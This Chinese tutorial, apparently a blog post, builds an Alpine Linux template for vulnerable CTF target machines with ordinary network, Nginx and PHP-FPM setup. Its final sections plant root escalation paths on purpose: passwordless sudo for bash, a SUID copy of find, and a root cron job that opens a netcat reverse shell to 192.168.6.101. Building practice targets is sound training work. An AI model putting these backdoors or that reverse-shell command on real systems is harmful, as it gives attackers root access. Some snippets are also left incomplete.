## 解决 VirtualBox 和 VMware 下网卡命名不一致导致的网络不可用问题

**说明**

本模板通过内核参数 net.ifnames=0 biosdevname=0 强制使用传统的 eth0 网络接口命名，以避免在 VirtualBox、VMware 等不同虚拟化平台之间迁移时因网卡命名差异导致网络不可用的问题。

优点：

- 跨虚拟化平台部署稳定，避免首次启动无网络
- 简化网络配置，适合作为靶机 / 漏洞演示模板
- 单网卡 + DHCP 场景下可预测性更高

注意事项：

- 该设置不适合多网卡或复杂网络环境
- 不推荐用于生产环境或云主机
- 如需扩展多网卡，请恢复可预测命名或使用 udev/MAC 绑定


解决 Linux 在不同虚拟化平台（VirtualBox / VMware）之间迁移时，因可预测网卡命名机制导致的网络接口命名不一致问题


下面仅尝试在 Alpine Linux 上进行说明，其他发行版未测试。

查看磁盘分区信息，root分区在 `/dev/sda3`

![](/images/template/8.png)

这个分区名可能会因不同虚拟化平台而变化，使用 `blkid` 命令查看分区的 UUID，UUID 永远指向同一个分区。

![](/images/template/7.png)

编辑 `/etc/update-extlinux.conf`，修改 bootloader（锁死 eth0 + 稳定 root 分区）

```bash
vi /etc/update-extlinux.conf
```


找到 default_kernel_opts 行，修改为如下内容：

```bash
# default_kernel_opts="quiet rootfstype=ext4"
default_kernel_opts="quiet rootfstype=ext4 net.ifnames=0 biosdevname=0"
```

文件里已经默认指定了 root 分区为 UUID

![](/images/template/9.png)

应用配置，重启验证

```bash
update-extlinux
reboot
```

验证内核参数

```bash
root=UUID=7762e2e9-4b0c-4cf2-a61b-23111b666c5f
net.ifnames=0
biosdevname=0
```

## 修改开机 tty 控制台提示

IP、hostname 等信息需要动态获取，ubuntu、kali等发行版可以直接在 `/etc/issue` 里使用变量`\4`、`\n`，但是 Alpine Linux 不支持。

Alpine 使用 OpenRC + getty 服务管理 tty 控制台登录。

编辑:

```bash
vi /etc/inittab
```

修改 tty1，参数解释：

- `-n`：表示不进行登录名的提示，直接调用指定的登录程序。
- `-l /usr/local/bin/tty-banner.sh`：指定登录程序为 `/usr/local/bin/tty-banner.sh` 脚本，而不是默认的登录程序（通常是 `/sbin/getty`）。这个脚本可以自定义登录提示信息。

```plaintext
tty1::respawn:/sbin/getty -n -l /usr/local/bin/tty-banner.sh 38500 tty1
```


创建 `/usr/local/bin/tty-banner.sh` 脚本

```bash
vi /usr/local/bin/tty-banner.sh
```

内容如下：

```bash
#!/bin/sh

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

/usr/bin/clear 2>/dev/null || clear

HOST="$(hostname 2>/dev/null || echo unknown)"

IP="$(
  /sbin/ip -4 addr show eth0 2>/dev/null \
  | /usr/bin/awk '/inet /{print $2}' \
  | /usr/bin/cut -d/ -f1
)"
[ -z "$IP" ] && IP="DHCP not ready"

cat <<'EOF'
Welcome to Alpine
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,     HackMyVM & MazeSec

QQ Group:   321948805
EOF

echo " Hostname : $HOST"
echo " IP Addr  : $IP"
exec /bin/login
```

赋予脚本可执行权限：

```bash
chmod +x /usr/local/bin/tty-banner.sh
```

效果图，丑是丑了点

![](/images/template/15.png)


流程：

```bash
init
 └─ getty (respawn)
      └─ -l tty-banner.sh
            ├─ 打印 banner
            └─ exec /bin/login
```



## 安装 sudo

Alpine Linux 默认没有安装 sudo，可以手动安装。

sudo 包含在 `community` 仓库中，确保已经启用该仓库，编辑 `/etc/apk/repositories` 文件，使用腾讯云镜像源：

```bash
cat > /etc/apk/repositories <<EOF
https://mirrors.cloud.tencent.com/alpine/v3.24/main
https://mirrors.cloud.tencent.com/alpine/v3.24/community
EOF
```

更新包索引并安装 sudo：

```bash
apk update
apk add sudo
```

验证安装成功：

```bash
sudo -V
```

```bash
ls -1 /etc/init.d | grep -E 'php|fpm'
```

```bash
rc-service php-fpm85 start

```

## 配置 PHP‑FPM

备份 `/etc/php85/php-fpm.d/www.conf` 文件

```bash
cp /etc/php85/php-fpm.d/www.conf /etc/php85/php-fpm.d/www.conf.bak
```

把非注释部分提取并覆盖回原文件

```bash
grep -v '^;' /etc/php85/php-fpm.d/www.conf.bak | grep '.' > /etc/php85/php-fpm.d/www.conf
```


编辑 php-fpm pool 配置，修改 `listen` 参数为 `/var/run/php-fpm.sock`

```bash
vi /etc/php85/php-fpm.d/www.conf
```

修改为以下内容（Alpine + Nginx 最佳实践）：

```bash
[www]
user = nginx
group = nginx

listen = /run/php-fpm85/php-fpm.sock

listen.owner = nginx
listen.group = nginx
listen.mode = 0660

pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3
```

**重启 php-fpm85，让 socket 生成**

```bash
rc-service php-fpm85 restart
```

验证生成了 php-fpm.sock ：

```bash
ls -l /run/php-fpm85/php-fpm.sock
```
## 配置 Nginx 解析 PHP

创建站点配置：

```bash
vi /etc/nginx/http.d/default.conf
```

内容如下：

```bash
server {
    listen 80;
    server_name _;

    root /var/www/html;
    index index.php index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_pass unix:/run/php-fpm85/php-fpm.sock;
    }
}
```

测试 Nginx 配置：

```bash
nginx -t
```

重载 Nginx：

```bash
rc-service nginx reload
```

权限与目录结构

```bash
mkdir -p /var/www/html
chown -R nginx:nginx /var/www/html
chmod -R 755 /var/www/html
mkdir -p /var/log/nginx
chown -R nginx:nginx /var/log/nginx
```

验证 PHP 是否正常工作

```bash
echo "<?php echo 'Hello, MazeSec!'; ?>" > /var/www/html/index.php
```

### 设置主机名

编辑 `/etc/hostname` 文件，设置主机名

```bash
hostname="Maze"
echo "$hostname" > /etc/hostname
cat >/etc/hosts <<EOF
127.0.0.1   localhost

```


### 简单设置提示符


创建 `/etc/bash/prompt.sh` 文件

```bash
cat > /etc/bash/prompt.sh <<'EOF'
[ -n "$BASH_VERSION" ] || return 0

if [ "$(id -u)" -eq 0 ]; then
  PS1='\[\e[1;31m\]\u\[\e[0m\]@\h:\w# '
else
  PS1='\[\e[1;32m\]\u\[\e[0m\]@\h:\w\$ '
fi
EOF
chmod 0644 /etc/bash/prompt.sh
```


给未来的用户生效：

```bash
mkdir -p /etc/skel
cat > /etc/skel/.bashrc <<'EOF'
case "$-" in
  *i*) [ -r /etc/bash/prompt.sh ] && . /etc/bash/prompt.sh ;;
esac
EOF
chmod 0644 /etc/skel/.bashrc
```

创建 `/etc/bash/bashrc` 文件，`/etc/profile.d/00-bashrc.sh`会调用这个文件：

```bash
cat > /etc/bash/bashrc <<'EOF'
[ -r /etc/bash/prompt.sh ] && . /etc/bash/prompt.sh
EOF
```

### 创建移除普通用户

**创建普通用户**

- -D : 使用默认选项创建用户，不会提示输入额外信息。
- -G : 指定用户所属的附加组，这里将用户添加到 the0n3 组中。
- -s : 指定用户的登录 shell，这里使用 /bin/bash。
- -h : 指定用户的主目录，这里设置为 /home/the0n3。
- -g : 用户描述信息。
```bash
addgroup the0n3
adduser -D -G the0n3 -s /bin/bash -h /home/the0n3 the0n3
echo "the0n3:todd" | chpasswd
```

方便出题，打印创建用户的命令

```bash
name='lanyangyang'
pass=$(openssl rand -base64 18)
shell="\nRun：\naddgroup $name\nadduser -D -G $name -s /bin/bash -h /home/$name $name\necho \"$name:$pass\" | chpasswd"
echo -e "$shell"
```


**移除普通用户**

```bash
# 移除用户及主目录

``` 

移除用户 the0n3 及其主目录：


### 创建自定义服务

创建 OpenRC 服务脚本

```bash
cat >/etc/init.d/app <<'EOF'
#!/sbin/openrc-run

name="app"
description="Run app.py as tuf user"

command="/usr/bin/python3"
command_args="/app/app.py"
command_user="tuf:tuf"

command_background="yes"
pidfile="/run/${RC_SVCNAME}.pid"

depend() {
    need net
}

EOF
```

授予执行权限

```bash
chmod +x /etc/init.d/app
```

加入开机自启动并立即启动

```bash
rc-update add app default
# rc-service app start
```


### 添加 sudo 权限

编辑 `/etc/sudoers` 文件，或 `/etc/sudoers.d/` 目录下创建新文件，以下几种格式：

```ini
# 允许用户 the0n3 使用 sudo 执行所有命令需要密码
the0n3 ALL=(ALL) ALL
# 允许用户 the0n3 使用 sudo 执行所有命令且不需要密码
the0n3 ALL=(ALL) NOPASSWD: ALL
# 允许用户 the0n3 使用 sudo 执行特定命令
the0n3 ALL=(ALL) NOPASSWD: /bin/ls, /usr/bin/id
```

给 the0n3 用户授权 sudo bash 举例:

```bash
echo 'the0n3 ALL=(ALL) NOPASSWD: /bin/bash' > /etc/sudoers.d/the0n3
chmod 0440 /etc/sudoers.d/the0n3
```


### 设置 SUID 权限

假设我们要创建一个拥有 SUID 权限的 `find` 命令作为提权点，这允许用户以文件所有者（通常是 root）的权限执行命令。

```bash
# 复制二进制文件到常用目录
cp /usr/bin/find /usr/local/bin/find

# 赋予 SUID 权限
chmod u+s /usr/local/bin/find
# 验证 SUID 权限
ls -l /usr/local/bin/find
```


### 定时任务

alpine 使用 `crond` 服务管理定时任务，可以在 `/etc/crontabs/` 目录下创建文件名为用户名的脚本文件。

```bash
echo '* * * * * root /bin/bash -c "busybox nc 192.168.6.101 4444 -e bash"' > /etc/crontabs/root
```
